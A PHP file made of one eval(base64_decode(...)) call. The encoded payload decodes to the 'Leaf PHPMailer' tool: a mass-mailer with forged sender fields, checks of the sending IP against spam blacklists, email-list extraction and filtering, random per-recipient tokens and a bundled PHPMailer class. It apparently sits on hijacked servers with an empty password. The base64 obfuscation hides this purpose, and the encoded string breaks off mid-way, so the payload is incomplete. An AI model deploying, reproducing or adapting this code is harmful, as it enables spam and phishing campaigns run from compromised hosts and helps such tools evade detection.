<?php


$password = "";

eval(base64_decode("c2Vzc2lvbl9zdGFydCgpOw0KZXJyb3JfcmVwb3J0aW5nKDApOw0Kc2V0X3RpbWVfbGltaXQoMCk7DQppbmlfc2V0KCJtZW1vcnlfbGltaXQiLC0xKTsNCg0KDQokbGVhZlsndmVyc2lvbiddPSIyLjgiOw0KJGxlYWZbJ3dlYnNpdGUnXT0ibGVhZm1haWxlci5wdyI7DQoNCg0KJHNlc3Npb25jb2RlID0gbWQ1KF9fRklMRV9fKTsNCmlmKCFlbXB0eSgkcGFzc3dvcmQpIGFuZCAkX1NFU1NJT05bJHNlc3Npb25jb2RlXSAhPSAkcGFzc3dvcmQpew0KICAgIGlmIChpc3NldCgkX1JFUVVFU1RbJ3Bhc3MnXSkgYW5kICRfUkVRVUVTVFsncGFzcyddID09ICRwYXNzd29yZCkgew0KICAgICAgICAkX1NFU1NJT05bJHNlc3Npb25jb2RlXSA9ICRwYXNzd29yZDsNCiAgICB9DQogICAgZWxzZSB7DQogICAgICAgIHByaW50ICI8cHJlIGFsaWduPWNlbnRlcj48Zm9ybSBtZXRob2Q9cG9zdD5QYXNzd29yZDogPGlucHV0IHR5cGU9J3Bhc3N3b3JkJyBuYW1lPSdwYXNzJz48aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nPj4nPjwvZm9ybT48L3ByZT4iOw0KICAgICAgICBleGl0OyAgICAgICAgDQogICAgfQ0KfQ0KDQpzZXNzaW9uX3dyaXRlX2Nsb3NlKCk7DQoNCg0KZnVuY3Rpb24gbGVhZkNsZWFyKCR0ZXh0LCRlbWFpbCl7DQoJJGUgPSBleHBsb2RlKCdAJywgJGVtYWlsKTsNCgkkZW1haWx1c2VyPSRlWzBdOw0KCSRlbWFpbGRvbWFpbj0kZVsxXTsNCiAgICAkdGV4dCA9IHN0cl9yZXBsYWNlKCJbLXRpbWUtXSIsIGRhdGUoIm0vZC9ZIGg6aTpzIGEiLCB0aW1lKCkpLCAkdGV4dCk7DQogICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiWy1lbWFpbC1dIiwgJGVtYWlsLCAkdGV4dCk7DQogICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiWy1lbWFpbHVzZXItXSIsICRlbWFpbHVzZXIsICR0ZXh0KTsNCiAgICAkdGV4dCA9IHN0cl9yZXBsYWNlKCJbLWVtYWlsZG9tYWluLV0iLCAkZW1haWxkb21haW4sICR0ZXh0KTsNCiAgICAkdGV4dCA9IHN0cl9yZXBsYWNlKCJbLXJhbmRvbWxldHRlcnMtXSIsIHJhbmRTdHJpbmcoJ2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JyksICR0ZXh0KTsNCiAgICAkdGV4dCA9IHN0cl9yZXBsYWNlKCJbLXJhbmRvbXN0cmluZy1dIiwgcmFuZFN0cmluZygnYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5JyksICR0ZXh0KTsNCiAgICAkdGV4dCA9IHN0cl9yZXBsYWNlKCJbLXJhbmRvbW51bWJlci1dIiwgcmFuZFN0cmluZygnMDEyMzQ1Njc4OScpLCAkdGV4dCk7DQogICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiWy1yYW5kb21tZDUtXSIsIG1kNShyYW5kU3RyaW5nKCdhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODknKSksICR0ZXh0KTsNCiAgICByZXR1cm4gJHRleHQ7ICANCn0NCmZ1bmN0aW9uIGxlYWZUcmltKCRzdHJpbmcpew0KCSRzdHJpbmc9dXJsZGVjb2RlKCRzdHJpbmcpOw0KICAgIHJldHVybiBzdHJpcHNsYXNoZXModHJpbSgkc3RyaW5nKSk7DQp9DQpmdW5jdGlvbiByYW5kU3RyaW5nKCRjb25zb25hbnRzKSB7DQogICAgJGxlbmd0aD1yYW5kKDEyLDI1KTsNCiAgICAkcGFzc3dvcmQgPSAnJzsNCiAgICBmb3IgKCRpID0gMDsgJGkgPCAkbGVuZ3RoOyAkaSsrKSB7DQogICAgICAgICAgICAkcGFzc3dvcmQgLj0gJGNvbnNvbmFudHNbKHJhbmQoKSAlIHN0cmxlbigkY29uc29uYW50cykpXTsNCiAgICB9DQogICAgcmV0dXJuICRwYXNzd29yZDsNCn0NCmZ1bmN0aW9uIGxlYWZNYWlsQ2hlY2soJGVtYWlsKXsNCiAgICBpZiAoZmlsdGVyX3ZhcigkZW1haWwsIEZJTFRFUl9WQUxJREFURV9FTUFJTCkpIHJldHVybiB0cnVlOw0KICAgIGVsc2UgcmV0dXJuIGZhbHNlOw0KfQ0KIyBCdWxpdC1pbiBCbGFja0xpc3QgQ2hlY2tlciANCmlmKGlzc2V0KCRfR0VUWydjaGVja19pcCddKSl7DQogICAgaWYgKGlzc2V0KCRfR0VUWydob3N0J10pKXsNCiAgICAgICAgJF9HRVRbJ2hvc3QnXT1leHBsb2RlKCIsIiwgJF9HRVRbJ2hvc3QnXSk7DQogICAgICAgIGZvcmVhY2ggKCRfR0VUWydob3N0J10gYXMgJGhvc3QpIHsNCiAgICAgICAgICAgIGlmIChjaGVja2Ruc3JyKCRfR0VUWydjaGVja19pcCddIC4gIi4iIC4gICRob3N0IC4gIi4iLCAiQSIpKSAkY2hlY2s9ICI8Zm9udCBjb2xvcj0ncmVkJz4gTGlzdGVkPC9mb250PiI7DQogICAgICAgICAgICBlbHNlICRjaGVjaz0gIjxmb250IGNvbG9yPSdncmVlbic+IENsZWFuPC9mb250PiI7DQogICAgICAgICAgICBwcmludCAnZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIicuICRob3N0LiciKS5pbm5lckhUTUwgPSAiJy4kY2hlY2suJyI7JzsNCiAgICAgICAgfQ0KDQogICAgICAgIGV4aXQ7DQogICAgfQ0KICAgICRkbnNibF9sb29rdXAgPSBhcnJheSgNCiAgICAgICAgImFsbC5zNWgubmV0IiwNCiAgICAgICAgImIuYmFycmFjdWRhY2VudHJhbC5vcmciLA0KICAgICAgICAiYmwuc3BhbWNvcC5uZXQiLA0KICAgICAgICAiYmxhY2tsaXN0Lndvb2R5LmNoIiwNCiAgICAgICAgImJvZ29ucy5jeW1ydS5jb20iLA0KICAgICAgICAiY2JsLmFidXNlYXQub3JnIiwNCiAgICAgICAgImNkbC5hbnRpLXNwYW0ub3JnLmNuIiwNCiAgICAgICAgImNvbWJpbmVkLmFidXNlLmNoIiwNCiAgICAgICAgImRiLndwYmwuaW5mbyIsDQogICAgICAgICJkbnNibC0xLnVjZXByb3RlY3QubmV0IiwNCiAgICAgICAgImRuc2JsLTIudWNlcHJvdGVjdC5uZXQiLA0KICAgICAgICAiZG5zYmwtMy51Y2Vwcm90ZWN0Lm5ldCIsDQogICAgICAgICJkbnNibC5hbnRpY2FwdGNoYS5uZXQiLA0KICAgICAgICAiZG5zYmwuZHJvbmVibC5vcmciLA0KICAgICAgICAiZG5zYmwuaW5wcy5kZSIsDQogICAgICAgICJkbnNibC5zb3Jicy5uZXQiLA0KICAgICAgICAiZHJvbmUuYWJ1c2UuY2giLA0KICAgICAgICAiZHVpbnYuYXVwYWRzLm9yZyIsDQogICAgICAgICJkdWwuZG5zYmwuc29yYnMubmV0IiwNCiAgICAgICAgImR5bmEuc3BhbXJhdHMuY29tIiwNCiAgICAgICAgImR5bmlwLnJvdGhlbi5jb20iLA0KICAgICAgICAiaHR0cC5kbnNibC5zb3Jicy5uZXQiLA0KICAgICAgICAiaXBzLmJhY2tzY2F0dGVyZXIub3JnIiwNCiAgICAgICAgIml4LmRuc2JsLm1hbml0dS5uZXQiLA0KICAgICAgICAia29yZWEuc2VydmljZXMubmV0IiwNCiAgICAgICAgIm1pc2MuZG5zYmwuc29yYnMubmV0IiwNCiAgICAgICAgIm5vcHRyLnNwYW1yYXRzLmNvbSIsDQogICAgICAgICJvcnZlZGIuYXVwYWRzLm9yZyIsDQogICAgICAgICJwYmwuc3BhbWhhdXMub3JnIiwNCiAgICAgICAgInByb3h5LmJsLmd3ZWVwLmNhIiwNCiAgICAgICAgInBzYmwuc3VycmllbC5jb20iLA0KICAgICAgICAicmVsYXlzLmJsLmd3ZWVwLmNhIiwNCiAgICAgICAgInJlbGF5cy5uZXRoZXIubmV0IiwNCiAgICAgICAgInNibC5zcGFtaGF1cy5vcmciLA0KICAgICAgICAic2hvcnQucmJsLmpwIiwNCiAgICAgICAgInNpbmd1bGFyLnR0ay5wdGUuaHUiLA0KICAgICAgICAic210cC5kbnNibC5zb3Jicy5uZXQiLA0KICAgICAgICAic29ja3MuZG5zYmwuc29yYnMubmV0IiwNCiAgICAgICAgInNwYW0uYWJ1c2UuY2giLA0KICAgICAgICAic3BhbS5kbnNibC5hbm9ubWFpbHMuZGUiLA0KICAgICAgICAic3BhbS5kbnNibC5zb3Jicy5uZXQiLA0KICAgICAgICAic3BhbS5zcGFtcmF0cy5jb20iLA0KICAgICAgICAic3BhbWJvdC5ibHMuZGlnaWJhc2UuY2EiLA0KICAgICAgICAic3BhbXJibC5pbXAuY2giLA0KICAgICAgICAic3BhbXNvdXJjZXMuZmFiZWwuZGsiLA0KICAgICAgICAidWJsLmxhc2hiYWNrLmNvbSIsDQogICAgICAgICJ1YmwudW5zdWJzY29yZS5jb20iLA0KICAgICAgICAidmlydXMucmJsLmpwIiwNCiAgICAgICAgIndlYi5kbnNibC5zb3Jicy5uZXQiLA0KICAgICAgICAid29ybXJibC5pbXAuY2giLA0KICAgICAgICAieGJsLnNwYW1oYXVzLm9yZyIsDQogICAgICAgICJ6Lm1haWxzcGlrZS5uZXQiLA0KICAgICAgICAiemVuLnNwYW1oYXVzLm9yZyIsDQogICAgICAgICJ6b21iaWUuZG5zYmwuc29yYnMubmV0IiwNCiAgICApOw0KICAgICRyZXZlcnNlX2lwID0gaW1wbG9kZSgiLiIsIGFycmF5X3JldmVyc2UoZXhwbG9kZSgiLiIsICRfR0VUWydjaGVja19pcCddKSkpOw0KICAgICRkbnNUID0gY291bnQoJGRuc2JsX2xvb2t1cCk7DQogICAgbGVhZmhlYWRlcigpOw0KICAgIHByaW50ICc8ZGl2IGNsYXNzPSJjb250YWluZXIgY29sLWxnLTYiPjxoMz48Zm9udCBjb2xvcj0iZ3JlZW4iPjxzcGFuIGNsYXNzPSJnbHlwaGljb24gZ2x5cGhpY29uLWxlYWYiPjwvc3Bhbj48L2ZvbnQ+IExlYWYgUEhQTWFpbGVyIDxzbWFsbD5CbGFja2xpc3QgQ2hlY2tlcjwvc21hbGw+PC9oMz4nOw0KICAgIFByaW50ICJDaGVja2luZyA8Yj4iLiRfR0VUWydjaGVja19pcCddLiI8L2I+IGluIDxiPiRkbnNUPC9iPiAgYW50aS1zcGFtIGRhdGFiYXNlczo8YnI+IjsNCiAgICAkZG5zTj0iIjsNCiAgICBwcmludCAnPHRhYmxlID4nOw0KICAgIGZvciAoJGk9MDsgJGkgPCAkZG5zVDsgJGk9JGkrMTApIHsgDQogICAgICAgICRob3N0PSIiOw0KICAgICAgICAkaG9zdHM9IiI7DQogICAgICAgIGZvcigkaj0kaTsgJGo8JGkrMTA7JGorKyl7DQogICAgICAgICAgICAkaG9zdD0kZG5zYmxfbG9va3VwWyRqXTsNCiAgICAgICAgICAgIGlmKCFlbXB0eSgkaG9zdCkpew0KICAgICAgICAgICAgICAgIHByaW50ICI8dHI+IDx0ZD4kaG9zdDwvdGQ+IDx0ZCBpZD0nJGhvc3QnPkNoZWNraW5nIC4uPC90ZD48L3RyPiI7DQogICAgICAgICAgICAgICAgJGhvc3RzIC49IiRob3N0LCI7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgJGRuc04uPSI8c2NyaXB0IHNyYz0nP2NoZWNrX2lwPSRyZXZlcnNlX2lwJmhvc3Q9Ii4kaG9zdHMuIicgdHlwZT0ndGV4dC9qYXZhc2NyaXB0Jz48L3NjcmlwdD4iOw0KICAgIH0NCg0KICAgIHByaW50ICc8L3RhYmxlPjwvZGl2Pic7DQogICAgcHJpbnQgJGRuc047DQogICAgZXhpdDsNCn0NCmlmKGlzc2V0KCRfR0VUWydlbWFpbGZpbHRlciddKSl7DQoNCiAgICBpZighZW1wdHkoJF9GSUxFU1snZmlsZVRvVXBsb2FkJ11bJ3RtcF9uYW1lJ10pKXsNCiAgICAgICAgJF9QT1NUWydlbWFpbExpc3QnXT0gZmlsZV9nZXRfY29udGVudHMoJF9GSUxFU1siZmlsZVRvVXBsb2FkIl1bInRtcF9uYW1lIl0pOyANCiAgICB9DQogICAgJF9QT1NUWydlbWFpbExpc3QnXT1zdHJ0b2xvd2VyKCRfUE9TVFsnZW1haWxMaXN0J10pOw0KICAgaWYoJF9HRVRbJ2VtYWlsZmlsdGVyJ109PSJpZnJhbSIpew0KICAgICAgICBpZiAoJF9QT1NUWydyZXN1bHR0eXBlJ10gPT0gImRvd25sb2FkIil7DQogICAgICAgICAgICBoZWFkZXIoIkNvbnRlbnQtRGVzY3JpcHRpb246IEZpbGUgVHJhbnNmZXIiKTsgDQogICAgICAgICAgICBoZWFkZXIoIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtIik7IA0KICAgICAgICAgICAgaGVhZGVyKCJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT1lbWFpbHMiLnRpbWUoKS4iLnR4dCIpOw0KICAgICAgICB9DQogICAgICAgIGVsc2Ugew0KICAgICAgICAgICAgaGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvcGxhaW4iKTsNCiAgICAgICAgfQ0KICAgIGlmKCRfUE9TVFsnc3VibWl0J109PSJleHRyYWN0Iil7DQogICAgICAgICRwYXR0ZXJuID0gJy9bQS1aYS16MC05Ll8lKy1dK0BbQS1aYS16MC05Li1dK1wuW0EtWmEtel17Miw0fS8nOw0KICAgICAgICBwcmVnX21hdGNoX2FsbCgkcGF0dGVybiwgJF9QT1NUWydlbWFpbExpc3QnXSwgJG1hdGNoZXMpOw0KICAgICAgICBmb3JlYWNoICgkbWF0Y2hlc1swXSBhcyAkZW1haWwpIHsNCiAgICAgICAgICAgIHByaW50ICRlbWFpbC4iDQoiOw0KICAgICAgICB9DQogICAgfQ0KICAgIGVsc2VpZiAoJF9QT1NUWydzdWJtaXQnXT09ImZpbHRlciIpIHsNCiAgICAgICAgJGVtYWlscz1leHBsb2RlKCINCiIsICRfUE9TVFsnZW1haWxMaXN0J10pOw0KICAgICAgICAka2V5d29yZHM9ZXhwbG9kZSgiDQoiLCBzdHJ0b2xvd2VyKCRfUE9TVFsna2V5d29yZHMnXSkpOw0KICAgICAgICBmb3JlYWNoICgkZW1haWxzIGFzICRlbWFpbCkgew0KICAgICAgICAgICAgZm9yZWFjaCAoJGtleXdvcmRzIGFzICRrZXl3b3JkICkgew0KICAgICAgICAgICAgICAgIGlmKHN0cnN0cigkZW1haWwsICRrZXl3b3JkKSApew0KICAgICAgICAgICAgICAgICAgICBwcmludCAkZW1haWwuIg0KIjsNCiAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICB9DQogICAgZXhpdDsNCiAgIH0NCiAgIGxlYWZoZWFkZXIoKTsNCiAgIHByaW50ICc8ZGl2IGNsYXNzPSJjb250YWluZXIgY29sLWxnLTQiPjxoMz48Zm9udCBjb2xvcj0iZ3JlZW4iPjxzcGFuIGNsYXNzPSJnbHlwaGljb24gZ2x5cGhpY29uLWxlYWYiPjwvc3Bhbj48L2ZvbnQ+IExlYWYgUEhQTWFpbGVyIDxzbWFsbD5FbWFpbCBGaWx0ZXI8L3NtYWxsPjwvaDM+JzsNCiAgIHByaW50ICcNCiAgICA8Zm9ybSBhY3Rpb249Ij9lbWFpbGZpbHRlcj1pZnJhbSIgbWV0aG9kPSJQT1NUIiB0YXJnZXQ9Im15LWlmcmFtZSIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgb25zdWJtaXQ9XCdcJz4NCiAgICAgICAgPGxhYmVsIGZvcj0iZW1haWxMaXN0Ij5UZXh0IDwvbGFiZWw+PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGVUb1VwbG9hZCIgaWQ9ImZpbGVUb1VwbG9hZCI+IA0KICAgICAgICBvcg0KDQogICAgICAgIDx0ZXh0YXJlYSBuYW1lPSJlbWFpbExpc3QiIGlkPSJlbWFpbExpc3QiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIHJvd3M9IjciIGlkPSJ0ZXh0QXJlYSI+PC90ZXh0YXJlYT4NCiAgICAgIDxkaXYgY2xhc3M9ImNvbC1sZy0xMiI+DQogICAgICAgIDxkaXYgY2xhc3M9InJhZGlvIj4NCiAgICAgICAgICA8bGFiZWw+DQogICAgICAgICAgICA8aW5wdXQgdHlwZT0icmFkaW8iIG5hbWU9InJlc3VsdHR5cGUiIGlkPSJyZXN1bHR0eXBlIiB2YWx1ZT0iaGVyZSIgY2hlY2tlZD0iIj4NCiAgICAgICAgICAgIFNob3cgUmVzdWx0IGluIHRoaXMgcGFnZQ0KICAgICAgICAgIDwvbGFiZWw+DQogICAgICAgIDwvZGl2Pg0KICAgICAgICA8ZGl2IGNsYXNzPSJyYWRpbyI+DQogICAgICAgICAgPGxhYmVsPg0KICAgICAgICAgICAgPGlucHV0IHR5cGU9InJhZGlvIiBuYW1lPSJyZXN1bHR0eXBlIiBpZD0icmVzdWx0dHlwZSIgdmFsdWU9ImRvd25sb2FkIj4NCiAgICAgICAgICAgIERvd25sb2FkIFJlc3VsdCAoZm9yIGJpZyBudW1iZXJzKQ0KICAgICAgICAgIDwvbGFiZWw+DQogICAgICAgIDwvZGl2Pg0KICAgICAgPC9kaXY+DQogICAgICAgICAgICA8bGVnZW5kPjxoND5FeHRyYWN0IEVtYWlsPC9oND48L2xlZ2VuZD4NCiAgICAgICAgICAgIERldGVjdGluZyBldmVyeSBlbWFpbCAoMTAwJSkgYW5kIG9yZGVyIHRoZW0gbGluZSBieSBsaW5lIDxicj48YnI+DQogICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJleHRyYWN0IiBjbGFzcz0iYnRuIGJ0bi1kZWZhdWx0IGJ0bi1zbSI+U3RhcnQ8L2J1dHRvbj4NCiAgICAgICAgICAgIDxsZWdlbmQ+PGg0PkZpbHRlciBFbWFpbHM8L2g0PjwvbGVnZW5kPg0KICAgICAgICA8bGFiZWwgPktleXdvcmRzIDxzbWFsbD4gZXg6IGdtYWlsLmNvbSBvciAuY28udWs8L3NtYWxsPiA8L2xhYmVsPjx0ZXh0YXJlYSBuYW1lPSJrZXl3b3JkcyIgaWQ9ImtleXdvcmRzIiBjbGFzcz0iZm9ybS1jb250cm9sIiByb3dzPSI0IiBpZD0idGV4dEFyZWEiPmdtYWlsLmNvbQ0KaG90bWFpbC5jb20NCnlhaG9vLmNvbQ0KLmNvLnVrPC90ZXh0YXJlYT48YnI+DQoNCiAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJmaWx0ZXIiIGNsYXNzPSJidG4gYnRuLWRlZmF1bHQgYnRuLXNtIj5TdGFydDwvYnV0dG9uPg0KICAgIDwvZm9ybT4NCiAgICA8bGFiZWwgPlJlc3VsdCA8L2xhYmVsPg0KICAgIDxpZnJhbWUgc3R5bGU9ImJvcmRlcjpub25lO3dpZHRoOjEwMCU7IiBuYW1lPSJteS1pZnJhbWUiICBzcmM9Ij9lbWFpbGZpbHRlcj1pZnJhbSIgPjwvaWZyYW1lPg0KICAgJzsNCiAgIGV4aXQ7DQoNCn0NCiRodG1sPSJjaGVja2VkIjsNCiR1dGY4PSJzZWxlY3RlZCI7DQokYml0OD0ic2VsZWN0ZWQiOw0KDQppZigkX1BPU1RbJ2FjdGlvbiddPT0ic2VuZCIgb3IgJF9QT1NUWydhY3Rpb24nXT09InNjb3JlIil7DQoNCiAgICAkc2VuZGVyRW1haWw9bGVhZlRyaW0oJF9QT1NUWydzZW5kZXJFbWFpbCddKTsNCiAgICAkc2VuZGVyTmFtZT1sZWFmVHJpbSgkX1BPU1RbJ3NlbmRlck5hbWUnXSk7DQogICAgJHJlcGx5VG89bGVhZlRyaW0oJF9QT1NUWydyZXBseVRvJ10pOw0KICAgICRzdWJqZWN0PWxlYWZUcmltKCRfUE9TVFsnc3ViamVjdCddKTsNCiAgICAkZW1haWxMaXN0PWxlYWZUcmltKCRfUE9TVFsnZW1haWxMaXN0J10pOw0KICAgICRtZXNzYWdlVHlwZT1sZWFmVHJpbSgkX1BPU1RbJ21lc3NhZ2VUeXBlJ10pOw0KICAgICRtZXNzYWdlTGV0dGVyPWxlYWZUcmltKCRfUE9TVFsnbWVzc2FnZUxldHRlciddKTsNCiAgICAkZW5jb2RpbmcgPSAkX1BPU1RbJ2VuY29kZSddOw0KICAgICRjaGFyc2V0ID0gJF9QT1NUWydjaGFyc2V0J107DQogICAgJGh0bWw9IiI7DQogICAgJHV0Zjg9IiI7DQogICAgJGJpdDg9IiI7DQoNCiAgICBpZigkbWVzc2FnZVR5cGU9PTIpICRwbGFpbj0iY2hlY2tlZCI7DQogICAgZWxzZSAkaHRtbD0iY2hlY2tlZCI7DQoNCiAgICBpZigkY2hhcnNldD09IklTTy04ODU5LTEiKSAkaXNvPSJzZWxlY3RlZCI7DQogICAgZWxzZSAkdXRmOD0ic2VsZWN0ZWQiOw0KDQogICAgaWYoJGVuY29kaW5nPT0iN2JpdCIpICRiaXQ3PSJzZWxlY3RlZCI7DQogICAgZWxzZWlmKCRlbmNvZGluZz09ImJpbmFyeSIpICRiaW5hcnk9InNlbGVjdGVkIjsNCiAgICBlbHNlaWYoJGVuY29kaW5nPT0iYmFzZTY0IikgJGJhc2U2ND0ic2VsZWN0ZWQiOw0KICAgIGVsc2VpZigkZW5jb2Rpbmc9PSJxdW90ZWQtcHJpbnRhYmxlIikgJHF1b3RlZHByaW50YWJsZT0ic2VsZWN0ZWQiOw0KICAgIGVsc2UgJGJpdDg9InNlbGVjdGVkIjsNCg0KDQoNCn0NCmlmKCRfUE9TVFsnYWN0aW9uJ109PSJ2aWV3Iil7DQoJJHZpZXdNZXNzYWdlPWxlYWZUcmltKCRfUE9TVFsnbWVzc2FnZUxldHRlciddKTsNCgkkdmlld01lc3NhZ2U9bGVhZkNsZWFyKCR2aWV3TWVzc2FnZSwidXNlckBkb21haW4uY29tIik7DQoJaWYgKCRfUE9TVFsnbWVzc2FnZVR5cGUnXT09Mil7DQoJCXByaW50ICI8cHJlPiIuaHRtbHNwZWNpYWxjaGFycygkdmlld01lc3NhZ2UpLiI8L3ByZT4iOw0KCX0NCgllbHNlIHsNCgkJcHJpbnQgJHZpZXdNZXNzYWdlOw0KCX0NCglleGl0Ow0KfQ0KDQoNCg0KaWYoIWlzc2V0KCRfUE9TVFsnc2VuZGVyRW1haWwnXSkpew0KICAgICRzZW5kZXJFbWFpbD0ic3VwcG9ydEAiLnN0cl9yZXBsYWNlKCJ3d3cuIiwgIiIsICRfU0VSVkVSWydIVFRQX0hPU1QnXSk7DQogICAgaWYgKCFsZWFmTWFpbENoZWNrKCRzZW5kZXJFbWFpbCkpICRzZW5kZXJFbWFpbD0iIjsNCn0NCg0KY2xhc3MgUEhQTWFpbGVyDQp7DQogICAgLyoqDQogICAgICogVGhlIFBIUE1haWxlciBWZXJzaW9uIG51bWJlci4NCiAgICAgKiBAdmFyIHN0cmluZw0KICAgICAqLw0KICAgIHB1YmxpYyAkVmVyc2lvbiA9ICc1LjIuMjgnOw0KDQogICAgLyoqDQogICAgICogRW1haWwgcHJpb3JpdHkuDQogICAgICogT3B0aW9uczogbnVsbCAoZGVmYXVsdCksIDEgPSBIaWdoLCAzID0gTm9ybWFsLCA1ID0gbG93Lg0KICAgICAqIFdoZW4gbnVsbCwgdGhlIGhlYWRlciBpcyBub3Qgc2V0IGF0IGFsbC4NCiAgICAgKiBAdmFyIGludGVnZXINCiAgICAgKi8NCiAgICBwdWJsaWMgJFByaW9yaXR5ID0gbnVsbDsNCg0KICAgIC8qKg0KICAgICAqIFRoZSBjaGFyYWN0ZXIgc2V0IG9mIHRoZSBtZXNzYWdlLg0KICAgICAqIEB2YXIgc3RyaW5nDQogICAgICovDQogICAgcHVibGljICRDaGFyU2V0ID0gJ2lzby04ODU5LTEnOw0KDQogICAgLyoqDQogICAgICogVGhlIE1JTUUgQ29udGVudC10eXBlIG9mIHRoZSBtZXNzYWdlLg0KICAgICAqIEB2YXIgc3RyaW5nDQogICAgICovDQogICAgcHVibGljICRDb250ZW50VHlwZSA9ICd0ZXh0L3BsYWluJzsNCg0KICAgIC8qKg0KICAgICAqIFRoZSBtZXNzYWdlIGVuY29kaW5nLg0KICAgICAqIE9wdGlvbnM6ICI4Yml0IiwgIjdiaXQiLCAiYmluYXJ5IiwgImJhc2U2NCIsIGFuZCAicXVvdGVkLXByaW50YWJsZSIuDQogICAgICogQHZhciBzdHJpbmcNCiAgICAgKi8NCiAgICBwdWJsaWMgJEVuY29kaW5nID0gJzhiaXQnOw0KDQogICAgLyoqDQogICAgICogSG9sZHMgdGhlIG1vc3QgcmVjZW50IG1haWxlciBlcnJvciBtZXNzYWdlLg0KICAgICAqIEB2YXIgc3RyaW5nDQogICAgICovDQogICAgcHVibGljICRFcnJvckluZm8gPSAnJzsNCg0KICAgIC8qKg0KICAgICAqIFRoZSBGcm9tIGVtYWlsIGFkZHJlc3MgZm9yIHRoZSBtZXNzYWdlLg0KICAgICAqIEB2YXIgc3RyaW5nDQogICAgICovDQogICAgcHVibGljICRGcm9tID0gJ3Jvb3RAbG9jYWxob3N0JzsNCg0KICAgIC8qKg0KICAgICAqIFRoZSBGcm9tIG5hbWUgb2YgdGhlIG1lc3NhZ2UuDQogICAgICogQHZhciBzdHJpbmcNCiAgICAgKi8NCiAgICBwdWJsaWMgJEZyb21OYW1lID0gJ1Jvb3QgVXNlcic7DQoNCiAgICAvKioNCiAgICAgKiBUaGUgU2VuZGVyIGVtYWlsIChSZXR1cm4tUGF0aCkgb2YgdGhlIG1lc3NhZ2UuDQogICAgICogSWYgbm90IGVtcHR5LCB3aWxsIGJlIHNlbnQgdmlhIC1mIHRvIHNlbmRtYWlsIG9yIGFzICdNQUlMIEZST00nIGluIHNtdHAgbW9kZS4NCiAgICAgKiBAdmFyIHN0cmluZw0KICAgICAqLw0KICAgIHB1YmxpYyAkU2VuZGVyID0gJyc7DQoNCiAgICAvKioNCiAgICAgKiBUaGUgUmV0dXJuLVBhdGggb2YgdGhlIG1lc3NhZ2UuDQogICAgICogSWYgZW1wdHksIGl0IHdpbGwgYmUgc2V0IHRvIGVpdGhlciBGcm9tIG9yIFNlbmRlci4NCiAgICAgKiBAdmFyIHN0cmluZw0KICAgICAqIEBkZXByZWNhdGVkIEVtYWlsIHNlbmRlcnMgc2hvdWxkIG5ldmVyIHNldCBhIHJldHVybi1wYXRoIGhlYWRlcjsNCiAgICAgKiBpdCdzIHRoZSByZWNlaXZlcidzIGpvYiAoUkZDNTMyMSBzZWN0aW9uIDQuNCksIHNvIHRoaXMgbm8gbG9uZ2VyIGRvZXMgYW55dGhpbmcuDQogICAgICogQGxpbmsgaHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzUzMjEjc2VjdGlvbi00LjQgUkZDNTMyMSByZWZlcmVuY2UNCiAgICAgKi8NCiAgICBwdWJsaWMgJFJldHVyblBhdGggPSAnJzsNCg0KICAgIC8qKg0KICAgICAqIFRoZSBTdWJqZWN0IG9mIHRoZSBtZXNzYWdlLg0KICAgICAqIEB2YXIgc3RyaW5nDQogICAgICovDQogICAgcHVibGljICRTdWJqZWN0ID0gJyc7DQoNCiAgICAvKioNCiAgICAgKiBBbiBIVE1MIG9yIHBsYWluIHRleHQgbWVzc2FnZSBib2R5Lg0KICAgICAqIElmIEhUTUwgdGhlbiBjYWxsIGlzSFRNTCh0cnVlKS4NCiAgICAgKiBAdmFyIHN0cmluZw0KICAgICAqLw0KICAgIHB1YmxpYyAkQm9keSA9ICcnOw0KDQogICAgLyoqDQogICAgICogVGhlIHBsYWluLXRleHQgbWVzc2FnZSBib2R5Lg0KICAgICAqIFRoaXMgYm9keSBjYW4gYmUgcmVhZCBieSBtYWlsIGNsaWVudHMgdGhhdCBkbyBub3QgaGF2ZSBIVE1MIGVtYWlsDQogICAgICogY2FwYWJpbGl0eSBzdWNoIGFzIG11dHQgJiBFdWRvcmEuDQogICAgICogQ2xpZW50cyB0aGF0IGNhbiByZWFkIEhUTUwgd2lsbCB2aWV3IHRoZSBub3JtYWwgQm9keS4NCiAgICAgKiBAdmFyIHN0cmluZw0KICAgICAqLw0KICAgIHB1YmxpYyAkQWx0Qm9keSA9ICcnOw0KDQogICAgLyoqDQogICAgICogQW4gaUNhbCBtZXNzYWdlIHBhcnQgYm9keS4NCiAgICAgKiBPbmx5IHN1cHBvcnRlZCBpbiBzaW1wbGUgYWx0IG9yIGFsdF9pbmxpbmUgbWVzc2FnZSB0eXBlcw0KICAgICAqIFRvIGdlbmVyYXRlIGlDYWwgZXZlbnRzLCB1c2UgdGhlIGJ1bmRsZWQgZXh0cmFzL0Vhc3lQZWFzeUlDUy5waHAgY2xhc3Mgb3IgaUNhbGNyZWF0b3INCiAgICAgKiBAbGluayBodHRwOi8vc3ByYWluLmNoL2Jsb2cvZG93bmxvYWRzL3BocC1jbGFzcy1lYXN5cGVhc3lpY3MtY3JlYXRlLWljYWwtZmlsZXMtd2l0aC1waHAvDQogIC